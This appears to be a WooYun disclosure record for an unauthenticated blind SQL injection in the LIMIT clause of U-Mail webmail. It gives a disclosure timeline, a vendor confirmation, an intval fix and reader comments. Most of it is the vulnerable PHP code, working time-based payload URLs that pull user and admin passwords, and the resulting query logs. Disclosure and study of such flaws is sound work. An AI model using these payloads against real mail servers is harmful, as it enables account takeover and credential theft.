{"id": 44046, "wybug_id": "wooyun-2015-094661", "wybug_title": "U-Mail邮件系统注入2(SQL Injections in MySQL LIMIT clause,无需登录，附获取用户密码脚本)", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-30 12:53", "wybug_open_date": "2015-05-05 08:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向公众公开  简要描述： SQL Injections in MySQL LIMIT clause，过滤不严，产生盲注，导致可以注射用户名与密码，无需登录 详细说明：  上次搜索只在client搜索，今天无意在fast目录下搜索了下，又发现了一处。注：client的目录下的所有函数必须登录才可以执行，fast的目录无需登录可以执行部分存在的函数，但并不能查看邮件等等。漏洞与上一个原理一样，但文件不同，此处访问权限设置不严格，可以任意用户访问，导致可以无需登录即可sql注入，limit无法使用sleep，用benchamark延时漏洞文件/fast/oab/module/operates.php代码\nif ( ACTION == \"member-get\" ){\t\t$dept_id = gss( $_GET['dept_id'] );\t\t$keyword = gss( $_GET['keyword'] );\t\t$page = $_GET['page'] ? gss( $_GET['page'] ) : 1;\t\t//limit\t\t$limit = $_GET['limit'] ? gss( $_GET['limit'] ) : 25;//用户可控的变量\t\t$orderby = gss( $_GET['orderby'] );\t\t$is_reverse = gss( $_GET['is_reverse'] );\t\t$data_cache = $Department->getDepartmentByDomainID( $domain_id, \"dept_id,name,parent_id,`order`\", 0 );\t\t$department_list = create_array( $data_cache, \"dept_id\", \"name\" );\t\t$where = \"\";\t\tif ( $dept_id && $dept_id != \"-1\" )\t\t{\t\t\t\t$Tree = $Department->getTreeObject( );\t\t\t\t$Tree->set_data_cache( $data_cache );\t\t\t\t$Tree->sort_data( -1, 1 );\t\t\t\t$dept_ids = $Tree->get_child_id( $dept_id );\t\t\t\t$user_ids = $Department->getMailboxIDByDepartmentID( $dept_ids, 0 );\t\t\t\t$where = \"t1.UserID IN (\".$user_ids.\")\";\t\t}\t\tif ( $keyword )\t\t{\t\t\t\tif ( $where )\t\t\t\t{\t\t\t\t\t\t$where .= \" AND \";\t\t\t\t}\t\t\t\tif ( strpos( $keyword, \"@\" ) )\t\t\t\t{\t\t\t\t\t\t$key_tmp = explode( \"@\", $keyword );\t\t\t\t\t\t$keyword = $key_tmp[0];\t\t\t\t}\t\t\t\t$where .= \"(t1.FullName LIKE \\\"%\".$keyword.\"%\\\" OR t1.Mailbox LIKE \\\"%\".$keyword.\"%\\\")\";\t\t}\t\tswitch ( $orderby )\t\t{\t\tcase \"fullname\" :\t\t\t\t$orderby = \"t1.FullName\";\t\t\t\tbreak;\t\tcase \"mailbox\" :\t\t\t\t$orderby = \"t1.Mailbox\";\t\t\t\tbreak;\t\tcase \"sex\" :\t\t\t\t$orderby = \"t2.sex\";\t\t\t\tbreak;\t\tcase \"birthday\" :\t\t\t\t$orderby = \"t2.birthday\";\t\t\t\tbreak;\t\tcase \"mobile\" :\t\t\t\t$orderby = \"t2.mobil\";\t\t\t\tbreak;\t\tcase \"tel\" :\t\t\t\t$orderby = \"t2.teleextension\";\t\t\t\tbreak;\t\tcase \"position\" :\t\t\t\t$orderby = \"t2.headship\";\t\t\t\tbreak;\t\tcase \"group_num\" :\t\t\t\t$orderby = \"t2.o_group\";\t\t\t\tbreak;\t\tcase \"email\" :\t\t\t\t$orderby = \"t1.Mailbox\";\t\t\t\tbreak;\t\t\t\t$orderby = \"\";\t\t}\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, $page, $limit, $orderby, $is_reverse, 0 );//进入了函数\n$limit可控，因而产生了注入，注入利用过程首先向url post数据，(注，其实该接口并非是任意登录，执行后仅可以执行仅有的几个函数，所以如果执行了有sql缺陷的函数，则产生相应了相应的无需登录的sql注入问题，如可以update密保问题则产生了获得任意用户密码的缺陷，但可访问的函数有限，并不能查看用户邮件等等)\n\n获得认证后，执行如下http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=member-get&limit=1,1+PROCEDURE+analyse(extractvalue(rand(),concat(0x3a,version())),1)发现结果如下\n\n其执行的sql语句为\n150128 21:44:43\t 3142 Connect\tumail@localhost on \t\t 3142 Query\tSET NAMES 'UTF8'\t\t 3142 Init DB\tumail\t\t 3142 Query\tSELECT dept_id,name,parent_id,`order` FROM oab_department WHERE domain_id='1' ORDER BY `order`,`dept_id`\t\t 3142 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 3142 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,version())),1)\t\t 3142 Quit\n\n\n由于未执行错误回显，因而我们实施盲注，代码为http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=member-get&limit=1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(ascii(substr((select password from userlist where userid=2),1,1))=97, BENCHMARK(50000000,SHA1(1)),1)))),1)\n\n其sql代码为\n150128 21:47:16\t 3144 Connect\tumail@localhost on \t\t 3144 Query\tSET NAMES 'UTF8'\t\t 3144 Init DB\tumail\t\t 3144 Query\tSELECT dept_id,name,parent_id,`order` FROM oab_department WHERE domain_id='1' ORDER BY `order`,`dept_id`\t\t 3144 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 3144 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(ascii(substr((select password from userlist where userid=2),1,1))=97, BENCHMARK(50000000,SHA1(1)),1)))),1)\n成功注入因而可以通过脚本跑不同的用户帐号和密码，管理员的#select+password+from+userlist+where+userid=2 system用户\t\t\t\t\t#select+password+from+web_usr+where+usr_code=1 administrator用户\t\t\t\t\t#select+password+from+web_usr+where+usr_code=2 admin用户普通用户的话遍历userid获取username password即可。附盲注脚本（脚本写的一半，未用二分法等，将就用）本地测试\n\n以及官网管理登录截图\n\n\n\n   漏洞证明：  如上   修复方案：  intval   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-02-04 08:24 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-30 12:55 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  发现最近各种u-mail的洞额     \n     2015-01-30 12:57 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  而且全是洞主发的    \n     2015-01-30 13:44 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  唉，没办法，他严重的问题太多了。    \n     2015-01-30 14:10 |    \t\txyzy \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 无)\t\t \n  你们到底还有完没完， 厂商的程序员都快被开除完了    \n     2015-05-05 09:36 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  膜拜一下大神啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}